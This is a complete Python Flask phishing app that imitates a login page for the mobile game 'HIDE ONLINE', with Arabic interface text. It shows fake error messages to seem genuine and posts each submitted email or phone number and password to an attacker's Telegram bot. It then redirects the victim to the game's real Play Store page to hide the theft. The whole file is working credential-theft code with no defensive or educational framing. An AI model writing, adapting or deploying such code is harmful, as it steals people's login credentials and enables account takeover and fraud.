import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "secure_app_secret_key_123")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# رابط التوجيه النهائي بعد إتمام التحقق
FINAL_REDIRECT_URL = "https://play.google.com/store/apps/details?id=com.hitrockgames.hideonline"


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  email_val = ""
  if request.method == "POST":
    email_val = request.form.get("email", "").strip()
    password = request.form.get("password", "")

    # نمط فحص صحة البريد الإلكتروني أو رقم الهاتف بدقة
    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
    phone_pattern = r"^\+?[0-9]{10,15}$"

    if not (
        re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
    ):
      error = (
          "لم يتم العثور على حسابك. يُرجى التحقق من عنوان البريد الإلكتروني أو"
          " رقم الهاتف."
      )
    elif len(password) <= 5:
      error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "🎮 تم استلام بيانات جديدة:\n\n📧 البريد/الحساب:"
            f" {email_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(FINAL_REDIRECT_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0f172a; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        
        .container {
            width: 100%;
            max-width: 380px;
            padding: 30px;
            background: #1e293b;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            border: 1px solid #334155;
        }

        .game-title {
            font-size: 26px;
            font-weight: 800;
            color: #38bdf8;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        .subtitle { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }

        .error-msg { 
            color: #f87171; 
            font-size: 13px; 
            line-height: 20px; 
            margin-bottom: 20px; 
            width: 100%; 
            text-align: right; 
            background: rgba(248, 113, 113, 0.1); 
            padding: 12px; 
            border-radius: 8px; 
            border: 1px solid rgba(248, 113, 113, 0.2); 
        }

        .input-group { width: 100%; margin-bottom: 16px; text-align: right; }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 14px;
            border: 1px solid #475569;
            border-radius: 10px;
            outline: none;
            color: #fff;
            background: #0f172a;
        }
        .input-group input:focus { border-color: #38bdf8; }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #0ea5e9, #2563eb);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.2s;
        }
        .submit-btn:hover { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="container">
        <div class="game-title">HIDE ONLINE</div>
        <div class="subtitle">تسجيل الدخول للمتابعة إلى اللعبة</div>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form method="POST" style="width: 100%;">
            <div class="input-group">
                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف" value="{{ email_val }}">
            </div>
            <div class="input-group">
                <input type="password" name="password" required placeholder="كلمة المرور">
            </div>
            <button type="submit" class="submit-btn">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
""",
      error=error,
      email_val=email_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
